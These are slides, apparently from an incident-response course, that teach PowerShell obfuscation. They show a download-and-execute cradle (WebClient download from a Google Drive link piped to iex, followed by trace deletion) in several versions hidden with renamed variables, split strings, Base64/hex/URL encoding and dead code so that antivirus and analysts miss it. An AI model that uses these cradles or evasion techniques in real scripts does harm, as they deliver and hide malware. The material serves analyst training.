---
title: "28강_Obfuscation_v1.2"
type: "acs-advance-pdf"
course: "ACS Advanced"
course_folder: "Incident Response"
source_path: "E:\\ProJect\\ACS File\\advance\\Incident Response\\28강_Obfuscation_v1.2.pdf"
source_size_bytes: 1085619
source_modified: 2025-11-12T13:23:49
imported_at: 2026-06-14T14:26:47
tags:
  - acs
  - acs-advanced
  - imported
---

# 28강_Obfuscation_v1.2

- Source: [28강_Obfuscation_v1.2.pdf](file:///E:/ProJect/ACS%20File/advance/Incident%20Response/28%EA%B0%95_Obfuscation_v1.2.pdf)

> Imported from PDF for Obsidian search. Verify formatting against the original file when exact layout matters.

## Page 1

Obfuscation
• What is obfuscation?
• Practice obfuscation
• More obfuscation!
28
1

## Page 2

What is obfuscation?01
Benefits of obfuscation
Protecting property
• By hiding key assets such as algorithms, technical approaches, and business logic within
source code, obfuscation can prevent competitors from analyzing and imitating them
Obstructing reverse engineering
• Obfuscation can thwart attempts to understand the internal structure of software
• Complex and difficult code structures can prevent malicious users from understanding how your
software works or finding security vulnerabilities, making your software and users more secure.
2

## Page 3

Disadvantages of obfuscation
Concealing malicious functionality
Effectively evade static and dynamic analysis by antivirus software
Obfuscated code can make it difficult to analyze the logic that performs malicious behavior
Bypass methods
Obfuscated code may use techniques to evade behavior-based detection techniques, such as
conditional execution, code generation at runtime, or changes to execution flow.
What is obfuscation?01
3

## Page 4

Using Powershell
Powershell is natively installed on Windows systems, so you don't need to install any tools or software to get started.
Provides the ability to call many built-in functions and methods of the .NET Framework directly
Easily apply advanced obfuscation techniques such as string encoding, data transformation, conditional logic execution, and more
Hiding the intent of your code by changing it to a
meaningless name
Rename variables and functions
Split important strings into parts and store them,
combine them at runtime
Splitting and combining strings
by encoding and encrypting parts of the code,
requiring additional steps to analyze
Encoding, encryption
Inserting fake code or unnecessary operations that
don't affect execution
Dead Code
Shorten the length of your code, but understand
what commands are actually executed right away
Alias
What is obfuscation?01
4

## Page 5

02
01
03
Checking existing scripts
Checking the base script before obfuscation
A little more! Obfuscation
Leverage the scripts you've worked on
Working with obfuscation
Rename variables and functions
Splitting and combining strings
Encoding, encryption
Dead Code
Practice obfuscation02
5

## Page 6

$url = "https://drive.usercontent.google.com/u/0/uc?id=1L_xSljSvfgx3ajzH5pBh1ROUWKui3dZt&export=download"
$dest = "$env:windir\system32\test"
mkdir $dest
$dest1 = "C:\Windows\system32\test\file.txt"
$client = New-Object System.net.webclient
$client.DownloadFile($url, $dest1)
Get-Content $dest1 | iex
rm $dest1
rm $dest
$URL: Link to download the file
$dest: save, create the path to the directory where the file will be
downloaded
$dest1: Store the final path and filename where the downloaded file
will be saved
$client: Creates an instance of the WebClient class in .NET, downloads
a file from the specified web address and saves it to the specified path
Reads the saved file and executes the sequence of molecules it contains
Delete traces
Original script
msg * download_clear
Text files
Practice obfuscation02
6

## Page 7

• A message window pops up that says
download_clear
Run Result
• While this may seem like a harmless notification
feature on its own, it can be exploited to download
additional malicious code
• The inclusion of scripts that maintain the
persistence of a breach within a system has the
potential to lead to serious security threats
Meaning
Practice obfuscation02
7

## Page 8

1
2
Why use it
• Used to intentionally make code less
readable and understandable
Caveats
• Meaningful names play an important role
in reading and understanding code
• When the name of a function or variable
reflects its function or purpose, third
parties can easily see and understand the
code as an analyst
name
Obfuscate variable and function names
Practice obfuscation02
اسم
8

## Page 9

$name = "Steve"
اسم " =steve"
You can use a variable named Name to
specify that Steve is a name
General usage
Poor readability due to the use of Arabic
Unfamiliar characters slow down analysis even
more
Rename variables
Practice obfuscation02
9

## Page 10

• Rename all variables to Arabic
• Makes code harder to read and understand, especially
guessing what variables mean
Rename variables
Obfuscation results
Launch Screen
• While humans have difficulty reading and understanding
characters, computers don't care whether a variable
name is in English, Arabic, Korean, or any other
language; they simply associate the identifier with a
specific value or data in memory
• Even if you obfuscate and complicate variable names,
computers still recognize them as legitimate code and
execute them
Normal execution
Practice obfuscation02
10

## Page 11

Splitting and combining strings
Powershell Obfuscation
• String splitting and combinatorial obfuscation is an obfuscation
technique in which important strings used within code, such as URLs, file
paths, and sensitive messages, are split into multiple parts and stored,
and then reassembled at runtime to reconstruct the original string
• Avoiding direct representations of strings, making code analysis difficult
and preventing information extraction through searching literal strings.
What is this?
Split the important string
 into multiple parts
Split
Reconstruct original strings
by combining them in a
specific order
Combinations
• String splitting and combinatorial obfuscation can be bypassed if
dynamic analysis tracks data flow at runtime
Limitations
Practice obfuscation02
11

## Page 12

$urlPart1 = "https://drive.usercontent"
$urlPart2 = ".google.com/u/0/uc?id=1L_xSljSvfgx3ajzH5pBh1ROUWKui3dZt"
$urlPart3 = "&export=download"
$url = $urlPart1 + $urlPart2 + $urlPart3
$destPart1 = "C:\Windows"
$destPart2 = "\system32\test"
$dest = $destPart1 + $destPart2
mkdir $dest
$destFilePart1 = $destPart1 + $destPart2
$destFilePart2 = "\file.txt"
$dest1 = $destFilePart1 + $destFilePart2
$client = New-Object System.net.webclient
$client.DownloadFile($url, $dest1)
Get-Content $dest1 | iex
rm $dest1
rm $dest
• Split URLs and file paths into parts, assign them to
variables, and combine them within the script to make
up the actual value
• Can make it difficult for someone viewing the code
directly to understand the full structure of the string at
a glance
• At runtime, the split strings are assembled and act as
normal URLs and file paths, fulfilling the purpose of
obfuscation without affecting the functionality of the
script
Split into multiple variables
Practice obfuscation02
12

## Page 13

$urlParts = @("https://drive.usercontent",
              ".google.com/u/0/uc?id=",
              "1L_xSljSvfgx3ajzH5pBh1ROUWKui3dZt",
              "&export=download"
              )
$url = $urlParts[0] + $urlParts[1] + $urlParts[2] + $urlParts[3]
$destParts = @("C:\Windows", "\system32\test")
$dest = $destParts[0] + $destParts[1]
mkdir $dest
$dest1Parts = @($dest, "\file.txt")
$dest1 = $dest1Parts[0] + $dest1Parts[1]
$client = New-Object System.net.webclient
$client.DownloadFile($url, $dest1)
Get-Content $dest1 | iex
rm $dest1
rm $dest
• Split each URL, destination path, and file path into
elements of an array, store them, and at runtime,
combine the elements of the array to create the original
values
• Obfuscation with arrays can make code harder to
understand and modify by requiring additional
interpretation by the person analyzing the code
Split into elements of an array
• Partitioning and assembly are commonly used in
conjunction with encoding or encryption
Tips
Practice obfuscation02
13

## Page 14

1
2
Encoding?
• Techniques that make scripts less readable,
making them harder to analyze
Features
• Encoding strings of code into another form,
without directly transforming the code
• The encoded script is decoded at runtime,
restored to the original code, and executed
Encoding
Practice obfuscation02
14

## Page 15

[System.Convert]::FromBase64String()
[System.Text.Encoding]::UTF8.GetString()
Static method belonging to the System.Convert class in the .NET Framework; used to convert a Base64-encoded string to a byte array
Mainly used to decode data from Base64 format to its original binary form
Description
NET Framework's System.Text.Encoding class, and is used to convert an array of bytes to a UTF-8 encoded string
Useful for network communication, reading files, or when you need to convert binary data to strings from other sources
Description
Practice obfuscation02
15

## Page 16

$base64Url = "aHR0cHM6Ly9kcml2ZS51c2VyY29udGVudC5nb29nbGUuY29tL3UvMC91Yz9pZD0xTF94U2xqU3ZmZ3gzYWp6SDVwQmgxUk9VV0t1aTNkWnQmZXhwb3J0PWRvd25sb2Fk"
$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64Url))
$hexDestPath = "433A5C57696E646F77735C73797374656D33325C746573745C66696C652E747874"
$destPath = -join ($hexDestPath -split '(..)' | Where-Object { $_ } | ForEach-Object { [char][convert]::ToInt32($_, 16) })
$dest = Split-Path -Path $destPath -Parent
if (-not (Test-Path -Path $dest)) {
    New-Item -ItemType Directory -Path $dest -Force
}
$client = New-Object System.Net.WebClient
$client.DownloadFile($url, $destPath)
Get-Content $destPath | iex
Remove-Item -Path $destPath
Remove-Item -Path $dest
• Decoding the Base64-encoded string stored in the
$base64Url variable into a byte array using the
[System.Convert]::FromBase64String() method
• Saving the result of converting the byte array to a UTF-8
string using the [System.Text.Encoding]::UTF8.GetString()
method
$url
• Decoding a Hex-encoded string stored in the hexDestPath
variable with a PowerShell script
• Each two-digit Hex value is converted to its corresponding
ASCII character to form the final file path, which is stored in
the
$destPath
Practice obfuscation02
16

## Page 17

$encodedUrl = "https%3A%2F%2F%2Fdrive.usercontent.google.com%2Fu%2F0%2Fuc%3Fid%3D1L_xSljSvfgx3ajzH5pBh1ROUWKui3dZt%26export%3Ddownload"
$url = [System.Net.WebUtility]::UrlDecode($encodedUrl)
$dest = Join-Path -Path $env:USERPROFILE -ChildPath "Documents\system32_test"
mkdir $dest -Force
$dest1 = Join-Path -Path $dest -ChildPath "file.txt"
Invoke-WebRequest -Uri $url -OutFile $dest1
Get-Content $dest1 | iex
Remove-Item -Path $dest1
Remove-Item -Path $dest -Force
• EncodeURL : URL encoded with the URL encoding
method is saved
• [System.Net.WebUtility]::UrlDecode($encodedUrl)
to decode an encoded URL
Description.
• How to encode characters that cannot be used in a URL as part of the
ASCII charset
• Use the % sign followed by a two-digit hexadecimal value
corresponding to the character's ASCII code
• Required to securely send reserved characters in the URL or non-ASCII
characters that cannot be directly included in the URL
URL encoding
Practice obfuscation02
17

## Page 18

43695231636D776750534169614852306348
4D364C79396B636D6C325A53353163325679
59323975644756756443356E6232396E62475
575593239744C3355764D433931597A39705
A443078544639345532787155335A6D5A336
77A5957703653445677516D6778556B39565
630743161544E6B576E516D5A58687762334
A3050575276643235736232466B49676F6B5
A47567A644341394943496B5A5735324F6E6
470626D5270636C787A65584E305A57307A4
D6C78305A584E30496770746132527063694
16B5A47567A64416F6B5A47567A644445675
0534169517A706356326C755A47393363317
87A65584E305A57307A4D6C78305A584E30
58475A70624755756448683049676F6B5932
78705A57353049443067546D56334C553969
616D566A6443425465584E305A573075626D
56304C6E646C596D4E736157567564416F6B
593278705A5735304C6B5276643235736232
466B526D6C735A53676B64584A734C43416B
5A47567A64444570436B646C644331446232
35305A5735304943526B5A584E304D534238
49476C6C654170796253416B5A47567A6444
454B636D30674A47526C6333514B
Base64+Hex
Decoding Hex
Result
Practice obfuscation02
18

## Page 19

CiR1cmwgPSAiaHR0cHM6Ly9kcml2ZS51c2VyY
29udGVudC5nb29nbGUuY29tL3UvMC91Yz9p
ZD0xTF94U2xqU3ZmZ3gzYWp6SDVwQmgxUk
9VV0t1aTNkWnQmZXhwb3J0PWRvd25sb2FkIg
okZGVzdCA9ICIkZW52OndpbmRpclxzeXN0ZW
0zMlx0ZXN0Igpta2RpciAkZGVzdAokZGVzdDEg
PSAiQzpcV2luZG93c1xzeXN0ZW0zMlx0ZXN0X
GZpbGUudHh0IgokY2xpZW50ID0gTmV3LU9ia
mVjdCBTeXN0ZW0ubmV0LndlYmNsaWVudAo
kY2xpZW50LkRvd25sb2FkRmlsZSgkdXJs
LCAkZGVzdDEpCkdldC1Db250ZW50ICRkZXN0
MSB8IGlleApybSAkZGVzdDEKcm0gJGRlc3QK
Decoding Base64
Result
Base64
Practice obfuscation02
19

## Page 20

$url = "https://drive.usercontent.google.com/u/0/uc?id=1L_xSljSvfgx3ajzH5pBh1ROUWKui3dZt&export=download"
$dest = "$env:windir\system32\test"
mkdir $dest
$dest1 = "C:\Windows\system32\test\file.txt"
$client = New-Object System.net.webclient
$client.DownloadFile($url, $dest1)
Get-Content $dest1 | iex
rm $dest1
rm $dest
iex $decodedString
Source code
Run Result
Practice obfuscation02
20

## Page 21

1
2
Dead Code?
An obfuscation technique that intentionally adds
code to the source code of software that is not
actually executed or has no effect on the outcome
of its execution
Features
• Some automated code analysis tools mistakenly
recognize dead code as actual executable code
• When detecting malicious activity based on
specific patterns or behaviors, Dead Code, when
properly placed, can bypass or confuse these
pattern-based detections
Dead
Code
Practice obfuscation02
21

## Page 22

function GenerateRandomNumber { return Get-Random -Minimum 1 -Maximum 100 }
$unusedVariable = "This is a dead code example"
$url = "https://drive.usercontent.google.com/u/0/uc?id=1L_xSljSvfgx3ajzH5pBh1ROUWKui3dZt&export=download"
$dest = "$env:windir\system32\test"
if ($unusedVariable.Length -gt 1000) { mkdir "C:\NonExistentFolder" }
mkdir $dest
$dest1 = "C:\Windows\system32\test\file.txt"
$client = New-Object System.net.webclient
$client.DownloadFile($url, $dest1)
Write-Output "Performing system check..."
Get-Content $dest1 | iex
for ($i = 0; $i -lt 5; $i++) { }
rm $dest1
rm $dest
$result = GenerateRandomNumber
Dead Code
• Function GenerateRandomNumber that is never actually called
• Unused variable $unusedVariable
• if statements where the condition is always false, for loops that do nothing
• Meaningless output
Practice obfuscation02
22

## Page 23

1
2
Alias
• A kind of shortcut command
• While aliases have the advantage of allowing
you to shorten long commands, indiscriminate
use of aliases can make your code difficult to
analyze.
Features
• A technique in software development, especially
in scripting languages, where short aliases are
used in place of native commands or function
calls to make code more difficult to understand
and analyze
• Reduces the readability of the code, requiring
more time and effort for analysts to understand
what the code does
Alias
Practice obfuscation02
23

## Page 24

More obfuscation!03
Rename variables More complex
Obfuscation
Partitioning and assemblyEncoding
Combine variable renaming, encoding, splitting, and assembling to create more complex obfuscated scripts
Combining different obfuscation techniques prevents automated code analysis tools from accurately analyzing code
More complex obfuscation
24

## Page 25

Obfuscation scripts
•The result of renaming variables to Arabic, Base64-encoding and splitting URLs and file paths to obfuscate them
•Utilize all of the scripts you've done so far and put them together with a few tweaks
More obfuscation!03
25

## Page 26

You can check the same execution result as
the original code
Run Result
More obfuscation!03
26
